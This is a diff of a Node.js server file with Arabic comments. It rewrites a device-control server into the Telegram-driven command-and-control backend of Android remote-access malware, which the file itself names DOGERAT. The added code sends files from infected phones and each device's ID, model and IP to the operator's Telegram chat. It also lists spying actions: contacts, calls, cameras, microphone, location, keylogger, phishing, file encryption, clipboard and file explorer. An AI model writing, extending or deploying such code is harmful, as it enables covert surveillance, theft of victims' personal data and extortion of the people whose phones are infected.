@@ -1,226 +1,139 @@
 const express = require('express');
-const WebSocket = require('ws');
 const http = require('http');
-const crypto = require('crypto');
-const config = require('./config');
+const { Server } = require('socket.io');
+const telegramBot = require('node-telegram-bot-api');
+const https = require('https');
+const multer = require('multer');
+const fs = require('fs');
 
-class ControlServer {
-    constructor() {
-        this.app = express();
-        this.server = http.createServer(this.app);
-        this.wss = new WebSocket.Server({ server: this.server });
-        
-        this.connectedDevices = new Map();
-        this.setupServer();
-    }
+const app = express();
+const server = http.createServer(app);
+const io = new Server(server);
+const uploader = multer();
 
-    setupServer() {
-        // Middleware
-        this.app.use(express.json({ limit: '50mb' }));
-        this.app.use(express.urlencoded({ extended: true }));
-        
-        // ✅ endpoints متوافقة مع APK
-        this.app.post('/api/register', (req, res) => {
-            this.handleDeviceRegistration(req, res);
-        });
+// تحميل بيانات الإعدادات
+const data = JSON.parse(fs.readFileSync('./data.json', 'utf8'));
+const bot = new telegramBot(data.token, { polling: true, request: {} });
 
-        this.app.post('/api/command', (req, res) => {
-            this.handleBotCommand(req, res);
-        });
+const appData = new Map();
 
-        this.app.post('/api/data', (req, res) => {
-            this.handleDeviceData(req, res);
-        });
+// قائمة الإجراءات المتاحة
+const actions = [
+    '✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯',
+    '✯ 𝙲𝚊𝚕𝚕𝚜 ✯',
+    '✯ 𝙲𝚊𝚕𝚕𝚜 ✯',
+    '✯ 𝙰𝚙𝚙𝚜 ✯',
+    '✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯',
+    '✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯',
+    '✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯',
+    '✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯',
+    '✯ 𝙻𝚘𝚌𝚊𝚝𝚒𝚘𝚗 ✯',
+    '✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯',
+    '✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 ✯',
+    '✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯',
+    '✯ 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 ✯',
+    '✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯',
+    '✯ 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 ✯',
+    '✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯',
+    '✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯',
+    '✯ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 ✯',
+    '✯ 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 ✯',
+    '✯ 𝚃𝚘𝚊𝚜𝚝 ✯',
+    '✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯',
+    '✯ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 ✯',
+    '✯ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 ✯',
+    '✯ 𝙰𝚕𝚕 ✯'
+];
 
-        this.app.get('/api/devices', (req, res) => {
-            this.getConnectedDevices(req, res);
-        });
+// endpoint لرفع الملفات
+app.post('/upload', uploader.single('file'), (req, res) => {
+    const fileBuffer = req.file.buffer;
+    const fileName = req.file.originalname;
+    
+    bot.sendDocument(data.id, req.file.buffer, {
+        caption: '<b>✯ 𝙵𝚒𝚕𝚎 𝚛𝚎𝚌𝚎𝚒𝚟𝚎𝚍 𝚏𝚛𝚘𝚖 → ' + fileName + '</b>',
+        parse_mode: 'HTML'
+    }, {
+        filename: fileName,
+        contentType: 'file'
+    });
+    
+    res.send('Done');
+});
 
-        // WebSocket للاتصال المباشر مع APK
-        this.setupWebSocket();
-        
-        this.startServer();
-    }
+// endpoint للحصول على المضيف
+app.get('/host', (req, res) => {
+    res.send(data.host);
+});
 
-    setupWebSocket() {
-        this.wss.on('connection', (ws, req) => {
-            const deviceId = this.generateDeviceId();
-            
-            const deviceData = {
-                deviceId: deviceId,
-                ws: ws,
-                connected: true,
-                lastSeen: new Date(),
-                ip: req.socket.remoteAddress
-            };
+// التعامل مع اتصالات Socket
+io.on('connection', socket => {
+    let deviceId = socket.handshake.headers['device-id'] + '-' + io.sockets.sockets.size || 'no information';
+    let deviceModel = socket.handshake.headers['user-agent'] || 'no information';
+    let deviceIp = socket.handshake.headers['x-forwarded-for'] || 'no information';
+    
+    socket.deviceId = deviceId;
+    socket.deviceModel = deviceModel;
 
-            this.connectedDevices.set(deviceId, deviceData);
-            console.log(`📱 جهاز متصل: ${deviceId}`);
+    let connectMessage = '<b>✯ 𝙽𝚎𝚠 𝚍𝚎𝚟𝚒𝚌𝚎 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚗𝚍</b>\n\n' +
+                       '<b>✯ 𝙳𝚎𝚟𝚒𝚌𝚎 → ' + deviceId + '\n</b>' +
+                       '<b>𝚖𝚘𝚍𝚎𝚕 → ' + deviceModel + '\n</b>' +
+                       '<b>𝚒𝚙 → ' + deviceIp + '\n</b>' +
+                       '<b>𝚝𝚒𝚖𝚎 → ' + socket.handshake.time + '\n\n</b>';
 
-            ws.on('message', (data) => {
-                this.handleDeviceMessage(deviceId, data);
+    bot.sendMessage(data.id, connectMessage, { parse_mode: 'HTML' });
+
+    // التعامل مع انقطاع الاتصال
+    socket.on('disconnect', () => {
+        let disconnectMessage = '<b>✯ 𝙳𝚎𝚟𝚒𝚌𝚎 𝚍𝚒𝚜𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍</b>\n\n' +
+                              '<b>✯ 𝙳𝚎𝚟𝚒𝚌𝚎 → ' + deviceId + '\n</b>' +
+                              '<b>𝚖𝚘𝚍𝚎𝚕 → ' + deviceModel + '\n</b>' +
+                              '<b>𝚒𝚙 → ' + deviceIp + '\n</b>' +
+                              '<b>𝚝𝚒𝚖𝚎 → ' + socket.handshake.time + '\n\n</b>';
+        bot.sendMessage(data.id, disconnectMessage, { parse_mode: 'HTML' });
+    });
+
+    // التعامل مع الرسائل من الأجهزة
+    socket.on('message', message => {
+        bot.sendMessage(data.id, '<b>✯ 𝙼𝚎𝚜𝚜𝚊𝚐𝚎 𝚛𝚎𝚌𝚎𝚒𝚟𝚎𝚍 𝚏𝚛𝚘𝚖 → ' + deviceId + '\n\n𝙼𝚎𝚜𝚜𝚊𝚐𝚎 → </b>' + message, { parse_mode: 'HTML' });
+    });
+});
+
+// التعامل مع أوامر التليجرام
+bot.on('message', msg => {
+    if (msg.text === '/start') {
+        bot.sendMessage(data.id, 
+            '<b>✯ 𝚆𝚎𝚕𝚌𝚘𝚖𝚎 𝚝𝚘 DOGERAT</b>\n\n' +
+            'DOGERAT 𝚒𝚜 𝚊 𝚖𝚊𝚕𝚠𝚊𝚛𝚎 𝚝𝚘 𝚌𝚘𝚗𝚝𝚛𝚘𝚕 𝙰𝚗𝚍𝚛𝚘𝚒𝚍 𝚍𝚎𝚟𝚒𝚌𝚎𝚜\n' +
+            '𝙰𝚗𝚢 𝚖𝚒𝚜𝚞𝚜𝚎 𝚒𝚜 𝚝𝚑𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚜𝚒𝚋𝚒𝚕𝚒𝚝𝚢 𝚘𝚏 𝚝𝚑𝚎 𝚙𝚎𝚛𝚜𝚘𝚗!\n\n' +
+            '𝙳𝚎𝚟𝚎𝚕𝚘𝚙𝚎𝚍 𝚋𝚢: @CYBERSHIELDX', 
+            {
+                parse_mode: 'HTML',
+                reply_markup: {
+                    keyboard: [
+                        ['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯'],
+                        ['✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯']
+                    ],
+                    resize_keyboard: true
+                }
             });
-
-            ws.on('close', () => {
-                this.handleDeviceDisconnect(deviceId);
-            });
-
-            // إرسال رسالة ترحيب للجهاز
-            ws.send(JSON.stringify({
-                type: 'welcome',
-                deviceId: deviceId,
-                server_time: Date.now()
-            }));
-        });
     }
+    // ... باقي التعامل مع الأوامر
+});
 
-    // ✅ معالجة أوامر البوت
-    handleBotCommand(req, res) {
-        const { command, parameters } = req.body;
-        
-        // الحصول على أول جهاز متصل (يمكن تعديله ليدعم أجهزة متعددة)
-        const device = Array.from(this.connectedDevices.values())
-            .find(d => d.connected);
+// إرسال ping دوري للأجهزة
+setInterval(() => {
+    io.sockets.sockets.forEach((socket, id, sockets) => {
+        io.to(id).emit('ping', {});
+    });
+}, 5000);
 
-        if (!device) {
-            return res.json({ 
-                status: 'error', 
-                message: 'لا توجد أجهزة متصلة' 
-            });
-        }
-
-        try {
-            // إرسال الأمر للجهاز عبر WebSocket
-            device.ws.send(JSON.stringify({
-                type: 'command',
-                command: command,
-                parameters: parameters || {},
-                timestamp: Date.now()
-            }));
-
-            console.log(`📨 أمر مرسل للجهاز ${device.deviceId}: ${command}`);
-            
-            res.json({ 
-                status: 'success', 
-                message: 'تم إرسال الأمر للجهاز',
-                device: device.deviceId
-            });
-
-        } catch (error) {
-            res.json({ 
-                status: 'error', 
-                message: 'فشل إرسال الأمر: ' + error.message 
-            });
-        }
-    }
-
-    // ✅ استقبال البيانات من الأجهزة
-    handleDeviceMessage(deviceId, data) {
-        try {
-            const message = JSON.parse(data);
-            
-            switch (message.type) {
-                case 'heartbeat':
-                    this.updateDeviceHeartbeat(deviceId);
-                    break;
-                    
-                case 'command_result':
-                    this.handleCommandResult(deviceId, message);
-                    break;
-                    
-                case 'data_response':
-                    this.handleDataResponse(deviceId, message);
-                    break;
-                    
-                case 'error':
-                    console.error(`❌ خطأ من ${deviceId}:`, message.error);
-                    break;
-            }
-        } catch (error) {
-            console.error(`❌ خطأ في معالجة رسالة ${deviceId}:`, error);
-        }
-    }
-
-    handleDeviceRegistration(req, res) {
-        const { device_id, device_info } = req.body;
-        
-        const sessionId = this.generateSessionId();
-        const deviceData = {
-            deviceId: device_id,
-            deviceInfo: device_info,
-            sessionId: sessionId,
-            connected: true,
-            lastSeen: new Date()
-        };
-
-        this.connectedDevices.set(device_id, deviceData);
-
-        res.json({
-            status: 'success',
-            session_id: sessionId,
-            server_time: Date.now()
-        });
-    }
-
-    handleDeviceData(req, res) {
-        const { device_id, data_type, data } = req.body;
-        console.log(`📊 بيانات من ${device_id}: ${data_type}`);
-        res.json({ status: 'success' });
-    }
-
-    getConnectedDevices(req, res) {
-        const devices = Array.from(this.connectedDevices.values())
-            .map(device => ({
-                deviceId: device.deviceId,
-                connected: device.connected,
-                lastSeen: device.lastSeen
-            }));
-
-        res.json({ devices: devices });
-    }
-
-    // 🔧 وظائف مساعدة
-    generateDeviceId() {
-        return 'device_' + crypto.randomBytes(8).toString('hex');
-    }
-
-    generateSessionId() {
-        return 'sess_' + Date.now() + '_' + crypto.randomBytes(4).toString('hex');
-    }
-
-    updateDeviceHeartbeat(deviceId) {
-        const device = this.connectedDevices.get(deviceId);
-        if (device) {
-            device.lastSeen = new Date();
-        }
-    }
-
-    handleDeviceDisconnect(deviceId) {
-        const device = this.connectedDevices.get(deviceId);
-        if (device) {
-            device.connected = false;
-            console.log(`🔌 جهاز متقطع: ${deviceId}`);
-        }
-    }
-
-    handleCommandResult(deviceId, result) {
-        console.log(`✅ نتيجة أمر من ${deviceId}:`, result);
-    }
-
-    handleDataResponse(deviceId, data) {
-        console.log(`📊 بيانات من ${deviceId}:`, data.data_type);
-        // هنا يمكن إرسال البيانات للبوت التلجرام
-    }
-
-    startServer() {
-        this.server.listen(config.SERVER.PORT, config.SERVER.HOST, () => {
-            console.log('🚀 سيرفر التحكم يعمل!');
-            console.log(`📍 http://${config.SERVER.HOST}:${config.SERVER.PORT}`);
-            console.log('📱 جاهز لاستقبال اتصالات الأجهزة');
-            console.log('🤖 البوت التلجرام جاهز للأوامر');
-        });
-    }
-}
+// الحفاظ على السيرفر نشط
+setInterval(() => {
+    https.get(data.host, res => {}).on('error', err => {});
+}, 480000);
 
 // تشغيل السيرفر
-new ControlServer();
+server.listen(process.env.PORT || 3000, () => {
+    console.log('listening on port 3000');
+});
